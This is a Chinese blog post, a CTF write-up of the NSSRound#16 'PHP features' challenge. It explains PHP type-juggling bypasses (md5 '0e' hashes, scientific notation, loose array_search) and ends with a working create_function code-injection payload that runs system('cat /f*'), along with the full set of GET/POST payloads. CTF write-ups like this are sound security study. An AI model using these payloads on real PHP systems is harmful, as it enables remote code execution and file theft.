<!DOCTYPE html><html lang="cn"><head><meta charset="utf-8"><title>没有人比我更懂PHP | It&#39;s Ba0k</title><meta name="author" content="Ba0k"><meta name="description" content="Life's a struggle..."><meta name="keywords" content=""><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><link rel="icon" href="/favicon.ico"><link rel="preconnect" href="https://cdn.staticfile.org"><script src="https://cdn.staticfile.org/vue/3.3.7/vue.global.prod.min.js"></script><link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.2/css/all.min.css"><script>const mixins = {};</script><script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script><script src="https://cdn.staticfile.org/highlight.js/11.9.0/highlight.min.js"></script><script src="https://cdn.staticfile.org/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script><link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/11.9.0/styles/github.min.css"><script src="/js/lib/highlight.js"></script><script src="/js/lib/preview.js"></script><link rel="stylesheet" href="/css/main.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="layout"><transition name="fade"><div id="loading" v-show="loading"><div id="loading-circle"><h2>LOADING...</h2></div></div></transition><div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}"><nav id="desktop-menu"><a class="title" href="/"><span>IT&#39;S BA0K</span> </a><a href="/"><i class="fa-solid fa-house fa-fw"></i> <span>&ensp;Home</span> </a><a href="/about"><i class="fa-solid fa-id-card fa-fw"></i> <span>&ensp;About</span> </a><a href="/archives"><i class="fa-solid fa-box-archive fa-fw"></i> <span>&ensp;Archives</span> </a><a href="/categories"><i class="fa-solid fa-bookmark fa-fw"></i> <span>&ensp;Categories</span> </a><a href="/tags"><i class="fa-solid fa-tags fa-fw"></i> <span>&ensp;Tags</span></a></nav><nav id="mobile-menu"><div class="title" @click="showMenuItems = !showMenuItems"><i class="fa-solid fa-bars fa-fw"></i> <span>&emsp;IT&#39;S BA0K</span></div><transition name="slide"><div class="items" v-show="showMenuItems"><a href="/"><div class="item"><div style="min-width:20px;max-width:50px;width:10%"><i class="fa-solid fa-house fa-fw"></i></div><div style="min-width:100px;max-width:150%;width:20%">Home</div></div></a><a href="/about"><div class="item"><div style="min-width:20px;max-width:50px;width:10%"><i class="fa-solid fa-id-card fa-fw"></i></div><div style="min-width:100px;max-width:150%;width:20%">About</div></div></a><a href="/archives"><div class="item"><div style="min-width:20px;max-width:50px;width:10%"><i class="fa-solid fa-box-archive fa-fw"></i></div><div style="min-width:100px;max-width:150%;width:20%">Archives</div></div></a><a href="/categories"><div class="item"><div style="min-width:20px;max-width:50px;width:10%"><i class="fa-solid fa-bookmark fa-fw"></i></div><div style="min-width:100px;max-width:150%;width:20%">Categories</div></div></a><a href="/tags"><div class="item"><div style="min-width:20px;max-width:50px;width:10%"><i class="fa-solid fa-tags fa-fw"></i></div><div style="min-width:100px;max-width:150%;width:20%">Tags</div></div></a></div></transition></nav></div><transition name="fade"><div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div></transition><div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'"><div class="article"><div><h1>没有人比我更懂PHP</h1></div><div class="info"><span class="date"><span class="icon"><i class="fa-solid fa-calendar fa-fw"></i> </span>2024/3/27 </span><span class="category"><a href="/categories/%E5%AD%A6%E4%B9%A0/"><span class="icon"><i class="fa-solid fa-bookmark fa-fw"></i> </span>学习 </a></span><span class="tags"><span class="icon"><i class="fa-solid fa-tags fa-fw"></i> </span><span class="tag"><a href="/tags/web/" style="color:#756480">web</a></span></span></div><div class="content" v-pre><p>走进我的世界，享受知识盛宴。</p><span id="more"></span><blockquote><p>宝贝，人和人，一场游戏</p></blockquote><h2 id="NSSRound-16-Basic-了解过PHP特性吗"><a href="#NSSRound-16-Basic-了解过PHP特性吗" class="headerlink" title="[NSSRound#16 Basic]了解过PHP特性吗"></a>[NSSRound#16 Basic]了解过PHP特性吗</h2><blockquote><p>这么多PHP特性你都知道吗</p></blockquote><p>话不多说，开题！</p><pre><code class="php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&quot;rce.php&quot;);
$checker_1 = FALSE;
$checker_2 = FALSE;
$checker_3 = FALSE;
$checker_4 = FALSE;
$num = $_GET[&#39;num&#39;];
if (preg_match(&quot;/[0-9]/&quot;, $num)) &#123;
    die(&quot;no!!&quot;);
&#125;
if (intval($num)) &#123;
    $checker_1 = TRUE;
&#125;
if (isset($_POST[&#39;ctype&#39;]) &amp;&amp; isset($_POST[&#39;is_num&#39;])) &#123;
    $ctype = strrev($_POST[&#39;ctype&#39;]);
    $is_num = strrev($_POST[&#39;is_num&#39;]);
    if (ctype_alpha($ctype) &amp;&amp; is_numeric($is_num) &amp;&amp; md5($ctype) == md5($is_num)) &#123;
        $checker_2 = TRUE;
    &#125;
&#125;
$_114 = $_GET[&#39;114&#39;];
$_514 = $_POST[&#39;514&#39;];
if (isset($_114) &amp;&amp; intval($_114) &gt; 114514 &amp;&amp; strlen($_114) &lt;= 3) &#123;
    if (!is_numeric($_514) &amp;&amp; $_514 &gt; 9999999) &#123;
        $checker_3 = TRUE;
    &#125;
&#125;
$arr4y = $_POST[&#39;arr4y&#39;];
if (is_array($arr4y)) &#123;
    for ($i = 0; $i &lt; count($arr4y); $i++) &#123;
        if ($arr4y[$i] === &quot;NSS&quot;) &#123;
            die(&quot;no!&quot;);
        &#125;
        $arr4y[$i] = intval($arr4y[$i]);
    &#125;
    if (array_search(&quot;NSS&quot;, $arr4y) === 0) &#123;
        $checker_4 = TRUE;
    &#125;
&#125;
if ($checker_1 &amp;&amp; $checker_2 &amp;&amp; $checker_3 &amp;&amp; $checker_4) &#123;
    echo $rce;
&#125;
</code></pre><p>代码审计一哈~</p><p>题目意思是有四个变量被赋值FALSE，一共有四关，闯过会有相应的变量被赋值TRUE，四个变量全部TRUE后会触发<code>echo $rce;</code></p><p>一关一关来就好了。</p><h4 id="checker-1"><a href="#checker-1" class="headerlink" title="checker_1"></a>checker_1</h4><p>传数组即可，没啥好说的</p><h4 id="checker-2"><a href="#checker-2" class="headerlink" title="checker_2"></a>checker_2</h4><p>先传参，然后逆转，再进入if，先检测是否为字符串&#x2F;数字，之后md5值进行弱比较</p><p>思路就是传入一个纯字母&#x2F;纯数字且md5后为0e开头的值，还要注意逆向</p><pre><code>ctype=OZDCKNQ&amp;is_num=807016042
</code></pre><h4 id="checker-3"><a href="#checker-3" class="headerlink" title="checker_3"></a>checker_3</h4><p>给114传参后和114514对比，而且长度要小于等于3，进入if后对514进行比对，不能是数字或数字字符串，还要大于9999999</p><p>使用科学计数法传参即可*</p><pre><code>GET
114=9e9
514=9e9e
</code></pre><h4 id="checker-4"><a href="#checker-4" class="headerlink" title="checker_4"></a>checker_4</h4><pre><code class="php">$arr4y = $_POST[&#39;arr4y&#39;];
if (is_array($arr4y)) &#123;
    for ($i = 0; $i &lt; count($arr4y); $i++) &#123;
        if ($arr4y[$i] === &quot;NSS&quot;) &#123;
            die(&quot;no!&quot;);
        &#125;
        $arr4y[$i] = intval($arr4y[$i]);
    &#125;
    if (array_search(&quot;NSS&quot;, $arr4y) === 0) &#123;
        $checker_4 = TRUE;
        echo (&quot;4yes&quot;);
    &#125;
&#125;
</code></pre><p>传一个数组，数组的值要求不能是NSS，再用它intval后的值覆盖本身，最后用array_search去匹配，要求键为0的元素的值可以与”NSS”匹配</p><p>传个NSS0即可，array_search函数的第三个参数为false，即此时是非严格匹配。所以我们只要让这个元素的值经过intval之后的结果为0，由于0和NSS在进行弱比较时结果为真，因此就满足了题目要求</p><pre><code>arr4y[]=NSS0
</code></pre><br><p>全都完成后提示前往<code>Rc3_function.php</code></p><h3 id="Rc3-function-php"><a href="#Rc3-function-php" class="headerlink" title="Rc3_function.php"></a>Rc3_function.php</h3><pre><code class="php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
$nss=$_POST[&#39;nss&#39;];
$shell = $_POST[&#39;shell&#39;];
if(isset($shell)&amp;&amp; isset($nss))&#123;
    $nss_shell = create_function($shell,$nss);
&#125;
</code></pre><p>是一个简单的<code>create_function</code>注入，具体原理就是闭合前面自定义函数，在后面插入代码，实现RCE，详情见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/p/16831601.html">creat_function()代码注入</a></p><p>这里直接构造payload：</p><pre><code>shell=&amp;nss=1;&#125;system(&#39;cat /f*&#39;);/*
</code></pre><p>得到flag</p><p>全部的payload:</p><pre><code>GET:
num[]=0&amp;114=9e9

POST:
514=9e9e&amp;arr4y%5B%5D=NSS0&amp;ctype=OZDCKNQ&amp;is_num=807016042

Rc3_function.php:
shell=&amp;nss=1;&#125;system(&#39;cat /f*&#39;);/*
</code></pre><br><p>这道题不错，知识面很广，对大佬来说很简单。因为时间原因这里很多地方都一笔带过，抱歉喵~！</p></div></div><footer id="footer"><div id="footer-wrap"><div>&copy; 2022 - 2024 It&#39;s Ba0k <span id="footer-icon"><i class="fa-solid fa-font-awesome fa-fw"></i> </span>&commat;Ba0k</div><div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a></div></div></footer></div><transition name="fade"><div id="preview" ref="preview" v-show="previewShow"><img id="preview-content" ref="previewContent"></div></transition></div><script src="/js/main.js"></script></body></html>